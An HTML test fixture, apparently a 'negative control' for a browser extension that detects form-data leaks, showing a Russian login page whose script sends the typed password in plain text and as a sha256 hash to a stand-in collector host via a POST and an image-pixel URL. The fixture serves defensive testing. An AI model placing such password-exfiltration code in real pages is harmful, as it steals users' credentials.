<!doctype html>
<html lang="ru">
  <head>
    <meta charset="utf-8" />
    <title>forms: password negative</title>
  </head>
  <body>
    <h1 id="title">Вход (пароль уходит третьей стороне)</h1>
    <!-- Negative control: the page itself sends the password in plain text and its sha256 to a third party (a POST
         with JSON keys named like passwords and a GET pixel ?ph=<sha256>). The extension never reads a password, so it
         has no fingerprint of it: no evidence may appear, and the value-match field count must not grow. -->
    <form id="form" action="#" onsubmit="return false">
      <label>Пароль <input id="password" type="password" name="password" autocomplete="current-password" /></label>
    </form>
    <script src="lib.js"></script>
    <script>
      var field = document.getElementById('password');
      field.addEventListener('blur', function () {
        var value = field.value;
        if (value.length === 0) return;
        var hex = window.formsLib.sha256Hex(value);
        var base = window.formsLib.receiver('pw.collect.example.org');
        fetch(base + '/fsink/pw', { method: 'POST', mode: 'no-cors', headers: { 'content-type': 'text/plain' }, body: JSON.stringify({ password: value, password_sha256: hex }) }).catch(function () {});
        var img = document.createElement('img');
        img.setAttribute('src', base + '/tr?ph=' + hex + '&pv=' + encodeURIComponent(value));
        window.formsLib.note('password-sent');
      });
    </script>
  </body>
</html>
